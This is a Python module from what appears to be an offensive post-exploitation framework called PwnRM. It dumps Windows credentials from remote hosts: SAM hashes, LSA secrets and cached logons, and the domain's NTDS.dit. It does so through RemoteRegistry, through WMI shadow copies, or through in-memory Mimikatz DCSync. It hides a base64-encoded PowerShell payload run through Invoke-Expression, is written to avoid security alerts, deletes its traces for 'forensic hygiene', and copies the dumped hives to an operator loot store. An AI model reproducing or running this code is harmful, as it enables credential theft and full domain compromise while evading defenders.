"""Ephemeral Volume Shadow Copy extraction and local secret decoding."""

import os
import re
import secrets
import shutil
import subprocess
from pathlib import PureWindowsPath
from typing import List, Any
from . import BaseModule
from ..core.credential_dump import (
    dump_remote_registry,
    extract_zip_artifacts,
    parse_registry_artifacts,
    zeroize,
)
from ..shell.ui import c, R, G, Y, B, M, C, DIM, BLD, RST
from ..shell.commands import b64str


class VSSModule(BaseModule):
    name = "vss"
    description = "Ephemeral WMI VSS SAM/LSA/NTDS extraction and secret display"
    author = "uziii2208"
    options = {
        "--drive": {"desc": "Target drive letter (default: C:)"},
        "sam": {"desc": "Extract only local SAM hashes using SAM and SYSTEM"},
        "lsa": {"desc": "Extract cached logons and LSA secrets using SECURITY and SYSTEM"},
        "ntds": {"desc": "Extract active NTDS.dit and SYSTEM hive (Domain Controllers)"},
        "--mimikatz": {"desc": "Use in-memory Mimikatz instead of RemoteRegistry/VSS staging"},
        "--mimikatz-executor": {"desc": "Local x64 Mimikatz PE for the in-memory backend"},
        "--user": {"desc": "DCSync only one NTDS account; implies --mimikatz"},
        "--download": {"desc": "Retain raw dump artifacts in the local PwnRM loot store"},
        "--clean": {"desc": "Compatibility flag; created shadow copies are always deleted"},
    }

    def run(self, shell, args: List[str]) -> Any:
        drive = "C:"
        retain_download = False
        use_mimikatz = False
        mimikatz_executor = ""
        selected_user = ""
        requested_modes = []
        index = 0
        while index < len(args):
            arg = args[index].lower()
            if arg == "--drive":
                if index + 1 >= len(args) or args[index + 1].startswith("-"):
                    shell.write_error("  [-] --drive requires a drive letter such as C:.")
                    return {"status": "error", "reason": "missing_drive"}
                drive = args[index + 1].rstrip("\\").upper()
                if not drive.endswith(":"):
                    drive += ":"
                index += 2
                continue
            if arg in {"sam", "--sam", "lsa", "--lsa", "ntds", "--ntds"}:
                requested_modes.append(arg.lstrip("-"))
                index += 1
                continue
            if arg == "--clean":
                index += 1
                continue
            if arg == "--mimikatz":
                use_mimikatz = True
                index += 1
                continue
            if arg == "--mimikatz-executor":
                if index + 1 >= len(args) or args[index + 1].startswith("-"):
                    shell.write_error("  [-] --mimikatz-executor requires a local x64 PE path.")
                    return {"status": "error", "reason": "missing_mimikatz_executor"}
                mimikatz_executor = args[index + 1]
                use_mimikatz = True
                index += 2
                continue
            if arg == "--user":
                if index + 1 >= len(args):
                    shell.write_error("  [-] --user requires an NTDS account name.")
                    return {"status": "error", "reason": "missing_user"}
                selected_user = args[index + 1]
                if not re.fullmatch(r"[A-Za-z0-9_.@\\$ -]{1,256}", selected_user):
                    shell.write_error(
                        "  [-] --user must be a simple account, DOMAIN\\account, or account@domain value."
                    )
                    return {"status": "error", "reason": "invalid_user"}
                use_mimikatz = True
                index += 2
                continue
            if arg == "--download":
                retain_download = True
                index += 1
                continue
            shell.write_error(f"  [-] Unknown VSS option: {args[index]}")
            return {"status": "error", "reason": "invalid_options"}

        if not re.fullmatch(r"[A-Z]:", drive):
            shell.write_error("  [-] Invalid VSS drive. Expected a drive letter such as C:.")
            return {"status": "error", "reason": "invalid_drive"}

        unique_modes = set(requested_modes)
        if len(unique_modes) > 1:
            shell.write_error("  [-] Choose exactly one of SAM, LSA, or NTDS extraction.")
            return {"status": "error", "reason": "conflicting_modes"}

        requested_mode = requested_modes[0] if requested_modes else "auto"
        drive_ps = shell._pse(drive)
        requested_mode_ps = shell._pse(requested_mode)

        if selected_user and requested_mode != "ntds":
            shell.write_error("  [-] --user is valid only with the ntds mode.")
            return {"status": "error", "reason": "user_requires_ntds"}
        if use_mimikatz and requested_mode not in {"sam", "ntds"}:
            shell.write_error("  [-] --mimikatz requires an explicit sam or ntds mode.")
            return {"status": "error", "reason": "mimikatz_requires_mode"}
        if use_mimikatz and retain_download:
            shell.write_error("  [-] --download cannot be combined with the diskless Mimikatz backend.")
            return {"status": "error", "reason": "mimikatz_has_no_download"}

        if use_mimikatz:
            candidates = [
                mimikatz_executor,
                os.environ.get("PWNRM_MIMIKATZ_EXECUTOR", ""),
                os.environ.get("PWNRM_LSA_EXECUTOR", ""),
                shutil.which("mimikatz.exe") or "",
                "/opt/resources/windows/mimikatz/x64/mimikatz.exe",
                "/opt/resources/windows/impacket-examples-windows/mimikatz.exe",
            ]
            executor = next(
                (candidate for candidate in candidates if candidate and os.path.isfile(candidate)),
                "",
            )
            if not executor:
                requested = f": {mimikatz_executor}" if mimikatz_executor else ""
                shell.write_error(f"  [-] No usable local Mimikatz x64 PE was found{requested}.")
                return {"status": "error", "reason": "mimikatz_not_found"}

            commands = ["privilege::debug"]
            if requested_mode == "sam":
                commands.extend(["token::elevate", "lsadump::sam"])
            else:
                domain = shell.run_sync("$env:USERDNSDOMAIN").strip()
                if not re.fullmatch(r"[A-Za-z0-9.-]{1,255}", domain):
                    shell.write_error("  [-] Could not resolve a safe AD DNS domain for DCSync.")
                    return {"status": "error", "reason": "invalid_domain"}
                selector = f"/user:{selected_user}" if selected_user else "/all /csv"
                commands.append(f"lsadump::dcsync /domain:{domain} {selector}")
            commands.append("exit")

            shell.write_info(
                c(
                    M + BLD,
                    f"  [*] Diskless {requested_mode.upper()} extraction through in-memory Mimikatz"
                    + (f" for {selected_user}" if selected_user else ""),
                )
            )
            forwarded = [
                "native",
                "--capture-output",
                "--timeout",
                "300",
                executor,
                *commands,
            ]
            result = shell.noconsolation(subprocess.list2cmdline(forwarded))
            if not isinstance(result, dict):
                result = {"status": "completed"}
            result.update(
                {
                    "mode": requested_mode,
                    "backend": "mimikatz",
                    "disk_staging": False,
                    "user": selected_user or None,
                }
            )
            return result

        if requested_mode in {"sam", "lsa"} and not retain_download:
            smb = None
            try:
                shell.write_info(c(C, f"  [~] Fast {requested_mode.upper()} dump through RemoteRegistry..."))
                smb = shell._open_authenticated_smb()
                records = dump_remote_registry(smb, requested_mode, do_kerberos=True)
                shell.write_info(c(M + BLD, f"\n  [*] Extracted {requested_mode.upper()} credential material"))
                if records:
                    for record in records:
                        shell.write_info(f"    {record}")
                else:
                    shell.write_warning("  [-] No printable credential material was extracted.")
                return {
                    "status": "completed",
                    "mode": requested_mode,
                    "records": len(records),
                    "downloaded": [],
                    "transport": "remote-registry",
                }
            except Exception as exc:
                shell.write_warning(
                    f"Fast RemoteRegistry path unavailable ({exc}); falling back to VSS."
                )
            finally:
                if smb is not None:
                    try:
                        smb.logoff()
                    except Exception:
                        pass

        try:
            remote_temp = shell._validate_remote_path(
                shell.run_sync("[System.IO.Path]::GetTempPath()").strip()
            )
            staging_name = f"pwnrm_vss_{secrets.token_hex(12)}"
            staging_dir = str(PureWindowsPath(remote_temp) / staging_name)
            archive_path = f"{staging_dir}.zip"
            staging_dir_ps = shell._pse(staging_dir)
            archive_path_ps = shell._pse(archive_path)
        except (OSError, ValueError) as exc:
            shell.write_error(f"  [-] Could not resolve a safe remote staging directory: {exc}")
            return {"status": "error", "reason": "unsafe_staging_path"}

        shell.write_info(c(M + BLD, f"  [*] PwnRM VSS Engine — initializing WMI-based shadow-copy staging on {drive}..."))

        ps = f"""
$ErrorActionPreference = 'Stop'
Write-Host "`n========================================================" -ForegroundColor Cyan
Write-Host "   PwnRM WMI VSS Extraction & Credential Hives" -ForegroundColor Cyan
Write-Host "========================================================`n" -ForegroundColor Cyan

$drive = '{drive_ps}\\'
$requestedMode = '{requested_mode_ps}'
$isDC = (Get-WmiObject Win32_ComputerSystem).DomainRole -ge 4
$stagingDir = '{staging_dir_ps}'
$archivePath = '{archive_path_ps}'
$targetHive = switch ($requestedMode) {{
    "ntds" {{ "NTDS.dit" }}
    "lsa"  {{ "LSA Secrets" }}
    "sam"  {{ "SAM" }}
    default {{ if ($isDC) {{ "NTDS.dit" }} else {{ "SAM" }} }}
}}

Write-Host "  [*] Target Volume : $drive" -ForegroundColor White
Write-Host "  [*] Target Mode   : $targetHive extraction" -ForegroundColor Gray

# 1. Create Volume Shadow Copy via WMI (No vssadmin.exe / ntdsutil.exe alerts)
Write-Host "`n[1. Creating Ephemeral Shadow Copy via WMI Win32_ShadowCopy]" -ForegroundColor Yellow
$shadowClass = [wmiclass]"Win32_ShadowCopy"
$createResult = $shadowClass.Create($drive, "ClientAccessible")

if ($createResult.ReturnValue -ne 0) {{
    $createCode = [uint32]$createResult.ReturnValue
    $vssErrors = @{{
        1 = "access denied"
        2 = "invalid volume argument"
        3 = "specified volume not found"
        4 = "specified volume is not supported"
        5 = "unsupported shadow-copy context"
        6 = "insufficient storage"
        7 = "volume is in use"
        8 = "maximum number of shadow copies reached"
        9 = "another shadow-copy operation is already in progress"
        10 = "shadow-copy provider vetoed the operation"
        11 = "shadow-copy provider is not registered"
        12 = "shadow-copy provider failure"
        13 = "unknown VSS error"
    }}
    $reason = $vssErrors[[int]$createCode]
    if (-not $reason) {{ $reason = "unrecognized VSS error" }}
    if ($createCode -eq 6) {{
        try {{
            $freeBytes = ([System.IO.DriveInfo]::new($drive)).AvailableFreeSpace
            $reason += " (free space: $freeBytes bytes)"
        }} catch {{}}
    }}
    throw "Failed to create Volume Shadow Copy: $reason (ReturnValue=$createCode)"
}}

$shadowId = $createResult.ShadowID
Write-Host "  [+] Shadow Copy Created successfully! ID: $shadowId" -ForegroundColor Green

$shadow = $null
try {{
    # 2. Retrieve Shadow Copy Device Object Path
    $shadow = Get-WmiObject Win32_ShadowCopy | Where-Object {{ $_.ID -eq $shadowId }}
    $deviceObj = $shadow.DeviceObject
    if (-not $deviceObj) {{ throw "Could not resolve the Shadow Copy DeviceObject" }}
    Write-Host "  [+] Device Object : $deviceObj" -ForegroundColor Green

    # 3. Extract Target Hives
    Write-Host "`n[2. Extracting Registry & Database Hives]" -ForegroundColor Yellow
    New-Item -Path $stagingDir -ItemType Directory | Out-Null

    # Copy SYSTEM hive
    $sysSrc = "$deviceObj\\Windows\\System32\\config\\SYSTEM"
    $sysDst = Join-Path $stagingDir "SYSTEM"
    [System.IO.File]::Copy($sysSrc, $sysDst, $true)
    $sysSize = (Get-Item $sysDst).Length
    $sysHash = (Get-FileHash -LiteralPath $sysDst -Algorithm SHA256).Hash
    Write-Host "  [+] SYSTEM Hive Extracted : $sysDst ($sysSize bytes)" -ForegroundColor Green
    Write-Host "      SHA-256: $sysHash" -ForegroundColor Gray

    if ($targetHive -eq "NTDS.dit") {{
        $ntdsSrc = "$deviceObj\\Windows\\NTDS\\ntds.dit"
        $ntdsDst = Join-Path $stagingDir "ntds.dit"
        if ([System.IO.File]::Exists($ntdsSrc)) {{
            [System.IO.File]::Copy($ntdsSrc, $ntdsDst, $true)
            $ntdsSize = (Get-Item $ntdsDst).Length
            $ntdsHash = (Get-FileHash -LiteralPath $ntdsDst -Algorithm SHA256).Hash
            Write-Host "  [!] NTDS.DIT Extracted   : $ntdsDst ($ntdsSize bytes)" -ForegroundColor Red
            Write-Host "      SHA-256: $ntdsHash" -ForegroundColor DarkRed
        }} else {{
            throw "ntds.dit was not found on $drive"
        }}
    }} elseif ($targetHive -eq "SAM") {{
        $samSrc = "$deviceObj\\Windows\\System32\\config\\SAM"
        $samDst = Join-Path $stagingDir "SAM"
        if ([System.IO.File]::Exists($samSrc)) {{
            [System.IO.File]::Copy($samSrc, $samDst, $true)
            $samSize = (Get-Item $samDst).Length
            $samHash = (Get-FileHash -LiteralPath $samDst -Algorithm SHA256).Hash
            Write-Host "  [+] SAM Hive Extracted    : $samDst ($samSize bytes)" -ForegroundColor Green
            Write-Host "      SHA-256: $samHash" -ForegroundColor Gray
        }} else {{ throw "SAM hive was not found on $drive" }}

    }} else {{
        $secSrc = "$deviceObj\\Windows\\System32\\config\\SECURITY"
        $secDst = Join-Path $stagingDir "SECURITY"
        if ([System.IO.File]::Exists($secSrc)) {{
            [System.IO.File]::Copy($secSrc, $secDst, $true)
            $secSize = (Get-Item $secDst).Length
            $secHash = (Get-FileHash -LiteralPath $secDst -Algorithm SHA256).Hash
            Write-Host "  [+] SECURITY Hive Extracted : $secDst ($secSize bytes)" -ForegroundColor Green
            Write-Host "      SHA-256: $secHash" -ForegroundColor Gray
        }} else {{ throw "SECURITY hive was not found on $drive" }}
    }}

    Add-Type -AssemblyName System.IO.Compression
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [IO.Compression.ZipFile]::CreateFromDirectory(
        $stagingDir,
        $archivePath,
        [IO.Compression.CompressionLevel]::Fastest,
        $false
    )
    $archiveSize = (Get-Item -LiteralPath $archivePath).Length
    Write-Host "  [+] Transfer archive prepared : $archiveSize bytes" -ForegroundColor Green
}} catch {{
    Write-Host "  [-] Error during file extraction: $_" -ForegroundColor Red
    throw
}} finally {{
    # 4. Immediate Forensics Cleanup: Delete Shadow Copy
    Write-Host "`n[3. Deleting Ephemeral Shadow Copy (Forensic Hygiene)]" -ForegroundColor Yellow
    $cleanupShadow = $shadow
    if (-not $cleanupShadow) {{
        $cleanupShadow = Get-WmiObject Win32_ShadowCopy -ErrorAction SilentlyContinue | Where-Object {{ $_.ID -eq $shadowId }}
    }}
    if ($cleanupShadow) {{ $null = $cleanupShadow.Delete() }}
    $remainingShadow = Get-WmiObject Win32_ShadowCopy -ErrorAction SilentlyContinue | Where-Object {{ $_.ID -eq $shadowId }}
    if ($remainingShadow) {{ throw "Shadow Copy $shadowId still exists after cleanup" }}
    Write-Host "  [+] Shadow Copy $shadowId deleted." -ForegroundColor Green
}}

Write-Host "`n  [*] Ephemeral staging complete; PwnRM will parse and remove $stagingDir." -ForegroundColor Cyan
"""
        encoded = b64str(ps.encode("utf-16le"))
        cmd = f"Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('{encoded}')))"
        artifacts = {}
        archive_data = None
        result = {"status": "error", "reason": "extraction_failed"}
        error_count = len(getattr(shell, "last_run_errors", []))
        try:
            if shell.run_with_interrupt(cmd, shell.write_line):
                result = {"status": "interrupted"}
            elif len(getattr(shell, "last_run_errors", [])) > error_count:
                result = {
                    "status": "error",
                    "reason": "remote_extraction_failed",
                    "error": "; ".join(shell.last_run_errors[error_count:]),
                }
            else:
                ntds_path = str(PureWindowsPath(staging_dir) / "ntds.dit")
                actual_mode = requested_mode
                if actual_mode == "auto":
                    is_ntds = shell.run_sync(
                        f"Test-Path -LiteralPath '{shell._pse(ntds_path)}' -PathType Leaf"
                    ).strip().lower() == "true"
                    actual_mode = "ntds" if is_ntds else "sam"

                if actual_mode == "ntds":
                    required = ["SYSTEM", "ntds.dit"]
                elif actual_mode == "lsa":
                    required = ["SYSTEM", "SECURITY"]
                else:
                    required = ["SYSTEM", "SAM"]

                shell.write_info(c(C, f"  [~] Streaming compressed {actual_mode.upper()} archive..."))
                archive_data = shell.read_remote_file(archive_path)
                artifacts = extract_zip_artifacts(archive_data, required)

                records = parse_registry_artifacts(actual_mode, artifacts)
                shell.write_info(c(M + BLD, f"\n  [*] Extracted {actual_mode.upper()} credential material"))
                if records:
                    for record in records:
                        shell.write_info(f"    {record}")
                else:
                    shell.write_warning("  [-] No printable credential material was extracted.")

                retained = []
                if retain_download:
                    target = str(getattr(shell, "target_info", {}).get("host", "target"))
                    for name, data in artifacts.items():
                        saved = shell.loot_mgr.store_artifact(
                            target,
                            "dumps",
                            f"{staging_name}_{name}",
                            data,
                            source_command=f"!vss {actual_mode} --download",
                        )
                        retained.append(saved)
                        shell.write_info(c(G, f"  [+] Retained dump artifact: {saved}"))
                result = {
                    "status": "completed",
                    "mode": actual_mode,
                    "records": len(records),
                    "downloaded": retained,
                }
        except Exception as exc:
            shell.write_error(f"  [-] VSS credential extraction failed: {exc}")
            result = {"status": "error", "reason": "local_processing_failed", "error": str(exc)}
        finally:
            zeroize(artifacts.values())
            if archive_data is not None:
                zeroize([archive_data])
            try:
                staging_cleaned = shell.delete_remote_path(staging_dir, recursive=True)
                archive_cleaned = shell.delete_remote_path(archive_path)
                cleaned = staging_cleaned and archive_cleaned
            except Exception as exc:
                cleaned = False
                shell.write_error(f"  [-] Remote VSS staging cleanup failed: {exc}")
            if not cleaned:
                shell.write_error(
                    f"  [-] Remote VSS staging still requires cleanup: {staging_dir} and/or {archive_path}"
                )
                result = {"status": "error", "reason": "remote_cleanup_failed", "path": staging_dir}
            else:
                shell.write_info(c(G, f"  [+] Remote VSS staging removed: {staging_dir} (+ archive)"))
        return result
